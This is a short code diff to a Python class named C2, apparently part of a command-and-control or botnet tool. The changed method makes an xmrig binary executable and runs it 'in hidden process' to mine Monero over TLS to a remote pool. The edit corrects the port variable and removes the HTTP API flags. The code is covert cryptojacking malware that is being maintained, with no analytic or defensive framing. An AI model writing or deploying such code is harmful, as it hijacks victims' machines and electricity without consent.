@@ -486,7 +486,7 @@ class C2():
                 os.chmod(xmrig_path, 755)
 
                 # excute xmrig in hidden process
-                params = xmrig_path_dev + " --url={url}:{port} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --http-host={host} --http-port={port} --threads={threads}".format(url=url, port=host_port, user=user, threads=threads)
+                params = xmrig_path_dev + " --url={url}:{host_port} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads}".format(url=url, host_port=host_port, user=user, threads=threads)
                 result = self._execute(params)
             except Exception as e:
                 util.log("{} error: {}".format(self._init_dev_miner.__name__, str(e)))
